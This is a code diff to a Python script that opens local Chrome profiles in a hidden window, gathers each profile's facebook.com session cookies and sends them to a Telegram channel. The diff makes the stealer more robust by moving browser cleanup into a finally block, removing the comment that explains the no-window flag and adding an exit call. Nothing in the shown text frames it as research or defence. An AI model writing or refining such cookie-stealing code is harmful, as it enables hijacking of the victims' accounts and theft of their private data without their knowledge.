@@ -43,18 +43,21 @@ def get_cookies(profile_name):
     chrome_options.add_argument("--disable-logging")
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
+    driver = None
     try:
         service = Service(ChromeDriverManager().install())
         service.log_path = os.devnull
-        service.creationflags = 0x08000000  # CREATE_NO_WINDOW flag
+        service.creationflags = 0x08000000
         driver = webdriver.Chrome(service=service, options=chrome_options)
         driver.get('https://www.facebook.com/')
         WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
         cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
-        driver.quit()
         return cookies
     except:
         return None
+    finally:
+        if driver:
+            driver.quit()
 
 def cookies_to_header_string(cookies):
     return "; ".join(f"{cookie['name']}={cookie['value']}" for cookie in cookies) if cookies else ""
@@ -76,3 +79,4 @@ if __name__ == "__main__":
         if cookies:
             profile_cookies[profile] = cookies
     send_telegram(profile_cookies)
+    sys.exit(0)
